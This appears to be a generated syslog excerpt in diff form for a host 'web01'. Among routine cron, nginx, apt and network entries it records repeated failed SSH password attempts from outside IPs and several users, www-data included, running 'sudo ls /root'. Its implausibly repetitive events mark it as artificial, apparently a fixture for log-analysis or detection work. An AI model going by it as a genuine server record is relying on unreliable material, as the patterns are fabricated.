+Aug 20 01:46:24 web01 CRON[758]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:46:28 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:46:29 web01 nginx[2280]: 200 0.406 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:46:33 web01 apt[4042]: Cache clean: removing index files
+Aug 20 01:46:40 web01 CRON[717]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:46:45 web01 systemd[1]: Rotate log files.
+Aug 20 01:46:49 web01 nginx[2310]: 200 0.318 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:46:53 web01 dbus-daemon[953]: systemd-logind: New session started
+Aug 20 01:47:00 web01 CRON[735]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:47:07 web01 CRON[789]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:47:11 web01 nginx[2507]: 200 0.243 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:47:14 web01 dbus-daemon[754]: systemd-logind: New session started
+Aug 20 01:47:19 web01 dbus-daemon[1238]: systemd-logind: New session started
+Aug 20 01:47:24 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:47:31 web01 audit[941]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:47:36 web01 dbus-daemon[693]: systemd-logind: New session started
+Aug 20 01:47:42 web01 postfix/smtpd[3061]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:47:43 web01 avahi-daemon[756]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:47:45 web01 sshd[1426]: Failed password for invalid user admin from 185.92.220.41 port 56370 ssh2 event=LOGIN_FAILED
+Aug 20 01:47:50 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:47:53 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:47:57 web01 audit[1823]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:48:00 web01 systemd[1]: Rotate log files.
+Aug 20 01:48:07 web01 sshd[1134]: Failed password for invalid user admin from 45.155.23.87 port 59246 ssh2 event=LOGIN_FAILED
+Aug 20 01:48:08 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:48:09 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:48:14 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:48:18 web01 NetworkManager[684]: DHCPv4 lease renewed on eth0
+Aug 20 01:48:24 web01 sshd[1258]: Accepted publickey for ubuntu from 10.0.3.11 port 51369 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:48:25 web01 sshd[1267]: Accepted publickey for ubuntu from 10.0.4.17 port 58788 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:48:29 web01 systemd[1]: Rotate log files.
+Aug 20 01:48:32 web01 NetworkManager[844]: DHCPv4 lease renewed on eth0
+Aug 20 01:48:33 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:48:34 web01 sshd[1441]: Failed password for invalid user user from 45.155.23.87 port 50134 ssh2 event=LOGIN_FAILED
+Aug 20 01:48:40 web01 dbus-daemon[679]: systemd-logind: New session started
+Aug 20 01:48:41 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:48:47 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:48:50 web01 sshd[1164]: Accepted publickey for deploy from 10.0.4.17 port 56092 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:48:56 web01 avahi-daemon[487]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:49:02 web01 audit[3785]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:49:03 web01 nginx[2557]: 200 0.539 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:49:08 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:49:12 web01 sshd[1390]: Failed password for invalid user test from 45.155.23.87 port 56371 ssh2 event=LOGIN_FAILED
+Aug 20 01:49:14 web01 postfix/smtpd[2661]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:49:21 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:49:23 web01 apt[2505]: Cache clean: removing index files
+Aug 20 01:49:24 web01 audit[1101]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:49:25 web01 sshd[1118]: Failed password for invalid user test from 185.92.220.41 port 45864 ssh2 event=LOGIN_FAILED
+Aug 20 01:49:30 web01 avahi-daemon[715]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:49:36 web01 dbus-daemon[729]: systemd-logind: New session started
+Aug 20 01:49:39 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:49:42 web01 avahi-daemon[642]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:49:45 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:49:47 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:49:51 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:49:58 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:50:01 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:50:02 web01 postfix/smtpd[2698]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:50:07 web01 avahi-daemon[728]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:50:12 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:50:17 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:50:23 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:50:25 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:50:26 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:50:32 web01 avahi-daemon[799]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:50:33 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:50:40 web01 dbus-daemon[1369]: systemd-logind: New session started
+Aug 20 01:50:46 web01 apt[2712]: Cache clean: removing index files
+Aug 20 01:50:48 web01 sshd[1130]: Accepted publickey for ubuntu from 10.0.5.44 port 58061 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:50:50 web01 NetworkManager[695]: DHCPv4 lease renewed on eth0
+Aug 20 01:50:51 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:50:57 web01 audit[3163]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:50:58 web01 systemd[1]: Rotate log files.
+Aug 20 01:51:04 web01 avahi-daemon[388]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:51:09 web01 systemd[1]: Rotate log files.
+Aug 20 01:51:15 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:51:18 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:51:25 web01 postfix/smtpd[3251]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:51:31 web01 nginx[2556]: 200 0.563 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:51:33 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:51:35 web01 apt[3697]: Cache clean: removing index files
+Aug 20 01:51:36 web01 CRON[815]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:51:40 web01 nginx[3097]: 200 0.223 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:51:43 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:51:47 web01 nginx[2245]: 200 0.371 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:51:48 web01 CRON[911]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:51:54 web01 NetworkManager[641]: DHCPv4 lease renewed on eth0
+Aug 20 01:51:56 web01 avahi-daemon[517]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:51:58 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:52:01 web01 postfix/smtpd[2450]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:52:07 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:52:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:52:13 web01 apt[3011]: Cache clean: removing index files
+Aug 20 01:52:14 web01 sshd[1131]: Failed password for invalid user admin from 45.155.23.87 port 40391 ssh2 event=LOGIN_FAILED
+Aug 20 01:52:21 web01 avahi-daemon[463]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:52:23 web01 CRON[795]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:52:29 web01 dbus-daemon[1160]: systemd-logind: New session started
+Aug 20 01:52:30 web01 systemd[1]: Rotate log files.
+Aug 20 01:52:37 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:52:39 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:52:46 web01 CRON[731]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:52:47 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:52:49 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:52:56 web01 apt[3516]: Cache clean: removing index files
+Aug 20 01:52:57 web01 postfix/smtpd[2836]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:52:59 web01 nginx[2563]: 200 0.291 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:53:02 web01 sshd[1417]: Failed password for invalid user admin from 45.155.23.87 port 60123 ssh2 event=LOGIN_FAILED
+Aug 20 01:53:07 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:53:11 web01 postfix/smtpd[2963]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:53:15 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:53:19 web01 CRON[864]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:53:26 web01 sshd[1465]: Accepted publickey for ubuntu from 10.0.5.44 port 62810 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:53:29 web01 sshd[1357]: Failed password for invalid user test from 185.158.106.77 port 58535 ssh2 event=LOGIN_FAILED
+Aug 20 01:53:32 web01 postfix/smtpd[2584]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:53:33 web01 nginx[2060]: 200 0.324 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:53:40 web01 apt[2619]: Cache clean: removing index files
+Aug 20 01:53:47 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:53:54 web01 systemd[1]: Rotate log files.
+Aug 20 01:53:56 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:53:59 web01 sshd[1298]: Accepted publickey for ubuntu from 10.0.4.17 port 59432 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:54:02 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:54:04 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:54:11 web01 apt[3234]: Cache clean: removing index files
+Aug 20 01:54:16 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:54:21 web01 systemd[1]: Rotate log files.
+Aug 20 01:54:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:54:33 web01 nginx[2077]: 200 0.602 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:54:34 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:54:35 web01 sshd[1414]: Accepted publickey for ubuntu from 10.0.3.11 port 65038 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:54:37 web01 avahi-daemon[524]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:54:43 web01 CRON[715]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:54:44 web01 CRON[898]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:54:45 web01 audit[1594]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:54:46 web01 postfix/smtpd[3364]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:54:52 web01 postfix/smtpd[2503]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:54:55 web01 nginx[2322]: 200 0.239 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:55:01 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:55:07 web01 nginx[3150]: 200 0.824 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:55:13 web01 audit[3323]: user=alex exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:55:16 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:55:20 web01 nginx[2603]: 200 0.805 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:55:22 web01 CRON[942]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:55:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:55:35 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:55:37 web01 dbus-daemon[1443]: systemd-logind: New session started
+Aug 20 01:55:44 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:55:50 web01 systemd[1]: Rotate log files.
+Aug 20 01:55:52 web01 nginx[2487]: 200 0.179 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:55:55 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:56:01 web01 audit[3465]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:56:07 web01 NetworkManager[943]: DHCPv4 lease renewed on eth0
+Aug 20 01:56:11 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:56:13 web01 NetworkManager[958]: DHCPv4 lease renewed on eth0
+Aug 20 01:56:16 web01 avahi-daemon[718]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:56:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:56:23 web01 postfix/smtpd[2570]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:56:27 web01 sshd[1292]: Failed password for invalid user test from 185.158.106.77 port 57892 ssh2 event=LOGIN_FAILED
+Aug 20 01:56:28 web01 avahi-daemon[753]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:56:35 web01 systemd[1]: Rotate log files.
+Aug 20 01:56:37 web01 sshd[1263]: Failed password for invalid user admin from 185.158.106.77 port 40657 ssh2 event=LOGIN_FAILED
+Aug 20 01:56:40 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:56:43 web01 CRON[741]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:56:49 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:56:52 web01 systemd[1]: Rotate log files.
+Aug 20 01:56:58 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:03 web01 audit[319]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:57:04 web01 nginx[2838]: 200 0.294 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:57:10 web01 systemd[1]: Rotate log files.
+Aug 20 01:57:16 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:57:17 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:19 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:23 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:25 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:27 web01 dbus-daemon[1500]: systemd-logind: New session started
+Aug 20 01:57:28 web01 sshd[1341]: Failed password for invalid user admin from 185.158.106.77 port 53024 ssh2 event=LOGIN_FAILED
+Aug 20 01:57:32 web01 audit[473]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:57:38 web01 systemd[1]: Rotate log files.
+Aug 20 01:57:41 web01 audit[864]: user=svc.backup exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:57:45 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:57:54 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:57:55 web01 NetworkManager[1154]: DHCPv4 lease renewed on eth0
+Aug 20 01:57:59 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:58:04 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:58:11 web01 sshd[1220]: Accepted publickey for deploy from 10.1.0.12 port 64445 ssh2 event=LOGIN_SUCCESS
+Aug 20 01:58:15 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:58:22 web01 NetworkManager[1114]: DHCPv4 lease renewed on eth0
+Aug 20 01:58:27 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:58:28 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:58:30 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:58:32 web01 avahi-daemon[414]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:58:33 web01 sshd[1421]: Failed password for invalid user user from 89.248.165.114 port 46616 ssh2 event=LOGIN_FAILED
+Aug 20 01:58:35 web01 avahi-daemon[482]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:58:38 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:58:39 web01 postfix/smtpd[2806]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:58:44 web01 nginx[3064]: 200 0.382 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 01:58:48 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 01:58:55 web01 NetworkManager[1135]: DHCPv4 lease renewed on eth0
+Aug 20 01:59:02 web01 postfix/smtpd[2824]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 01:59:04 web01 CRON[936]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 01:59:05 web01 systemd[1]: Rotate log files.
+Aug 20 01:59:12 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:59:16 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:59:21 web01 dbus-daemon[538]: systemd-logind: New session started
+Aug 20 01:59:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:59:28 web01 dbus-daemon[1210]: systemd-logind: New session started
+Aug 20 01:59:32 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:59:38 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 01:59:41 web01 audit[1483]: user=root exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:59:48 web01 avahi-daemon[509]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 01:59:51 web01 audit[2951]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 01:59:57 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 01:59:59 web01 nginx[2907]: 200 0.861 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:00:06 web01 avahi-daemon[487]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:00:12 web01 postfix/smtpd[3061]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:00:13 web01 CRON[933]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:00:20 web01 postfix/smtpd[2896]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:00:27 web01 sshd[1181]: Accepted publickey for deploy from 10.0.5.23 port 58442 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:00:28 web01 nginx[2826]: 200 0.618 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:00:30 web01 avahi-daemon[618]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:00:35 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:00:42 web01 CRON[763]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:00:43 web01 sshd[1288]: Failed password for invalid user test from 185.92.220.41 port 48977 ssh2 event=LOGIN_FAILED
+Aug 20 02:00:50 web01 sshd[1115]: Failed password for invalid user test from 45.155.23.87 port 62320 ssh2 event=LOGIN_FAILED
+Aug 20 02:00:52 web01 postfix/smtpd[3008]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:00:56 web01 CRON[850]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:01:01 web01 nginx[2529]: 200 0.267 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:01:07 web01 avahi-daemon[396]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:01:10 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:01:12 web01 audit[977]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:01:19 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:01:25 web01 CRON[831]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:01:26 web01 audit[2894]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:01:27 web01 sshd[1104]: Failed password for invalid user admin from 185.92.220.41 port 59698 ssh2 event=LOGIN_FAILED
+Aug 20 02:01:29 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:01:35 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:01:39 web01 audit[1528]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:01:43 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:01:46 web01 NetworkManager[1006]: DHCPv4 lease renewed on eth0
+Aug 20 02:01:51 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:01:56 web01 dbus-daemon[1123]: systemd-logind: New session started
+Aug 20 02:01:59 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:02:03 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:02:09 web01 nginx[2534]: 200 0.383 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:02:15 web01 NetworkManager[905]: DHCPv4 lease renewed on eth0
+Aug 20 02:02:17 web01 CRON[930]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:02:18 web01 avahi-daemon[760]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:02:25 web01 dbus-daemon[1176]: systemd-logind: New session started
+Aug 20 02:02:28 web01 NetworkManager[626]: DHCPv4 lease renewed on eth0
+Aug 20 02:02:34 web01 sshd[1307]: Failed password for invalid user test from 185.158.106.77 port 53715 ssh2 event=LOGIN_FAILED
+Aug 20 02:02:38 web01 apt[3694]: Cache clean: removing index files
+Aug 20 02:02:44 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:02:47 web01 apt[2955]: Cache clean: removing index files
+Aug 20 02:02:53 web01 sshd[1253]: Accepted publickey for deploy from 10.0.3.11 port 58311 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:03:00 web01 CRON[775]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:03:01 web01 sshd[1386]: Failed password for invalid user user from 185.158.106.77 port 63762 ssh2 event=LOGIN_FAILED
+Aug 20 02:03:08 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:03:14 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:03:16 web01 apt[3128]: Cache clean: removing index files
+Aug 20 02:03:20 web01 avahi-daemon[519]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:03:23 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:03:27 web01 audit[319]: user=ubuntu exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:03:34 web01 dbus-daemon[1094]: systemd-logind: New session started
+Aug 20 02:03:39 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:03:44 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:03:49 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:03:56 web01 audit[920]: user=www-data exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:03:59 web01 postfix/smtpd[2983]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:04:03 web01 CRON[899]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:04:04 web01 sshd[1424]: Failed password for invalid user user from 185.92.220.41 port 50269 ssh2 event=LOGIN_FAILED
+Aug 20 02:04:05 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:04:07 web01 apt[2845]: Cache clean: removing index files
+Aug 20 02:04:12 web01 apt[3502]: Cache clean: removing index files
+Aug 20 02:04:19 web01 apt[2680]: Cache clean: removing index files
+Aug 20 02:04:21 web01 dbus-daemon[1148]: systemd-logind: New session started
+Aug 20 02:04:25 web01 postfix/smtpd[3388]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:04:29 web01 postfix/smtpd[2438]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:04:34 web01 CRON[943]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:04:35 web01 audit[3512]: user=sysop exe="/usr/bin/sudo" args="ls /root" event=AUDIT
+Aug 20 02:04:40 web01 CRON[860]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:04:46 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:04:49 web01 CRON[828]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:04:54 web01 nginx[2093]: 200 0.166 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:04:57 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:05:03 web01 sshd[1451]: Accepted publickey for deploy from 10.0.5.44 port 64548 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:05:05 web01 nginx[2735]: 200 0.601 - GET / HTTP/1.1 "-" "Mozilla/5.0"
+Aug 20 02:05:12 web01 CRON[704]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:05:14 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:05:16 web01 apt[3707]: Cache clean: removing index files
+Aug 20 02:05:21 web01 CRON[882]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:05:27 web01 avahi-daemon[542]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:05:33 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
+Aug 20 02:05:38 web01 kernel[0]: audit: backlog limit exceeded
+Aug 20 02:05:44 web01 avahi-daemon[374]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:05:50 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:05:54 web01 CRON[821]: (www-data) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:06:00 web01 CRON[777]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:06:04 web01 NetworkManager[1132]: DHCPv4 lease renewed on eth0
+Aug 20 02:06:07 web01 dbus-daemon[1217]: systemd-logind: New session started
+Aug 20 02:06:09 web01 postfix/smtpd[3320]: disconnect from localhost[127.0.0.1] ehlo=1 mail=1 rcpt=1 data=1 quit=1 commands=5
+Aug 20 02:06:10 web01 sshd[1154]: Accepted publickey for ubuntu from 10.0.3.11 port 51867 ssh2 event=LOGIN_SUCCESS
+Aug 20 02:06:14 web01 CRON[899]: (root) CMD (/usr/local/bin/php -f /var/www/html/cron.php)
+Aug 20 02:06:17 web01 avahi-daemon[453]: Registering new address record for fe80::/64 on eth0.*.
+Aug 20 02:06:20 web01 NetworkManager[902]: DHCPv4 lease renewed on eth0
+Aug 20 02:06:22 web01 systemd[1]: Started Daily apt download activities.
+Aug 20 02:06:24 web01 NetworkManager[1092]: DHCPv4 lease renewed on eth0
+Aug 20 02:06:27 web01 kernel[0]: eth0: link is up at 1000 Mbps full-duplex
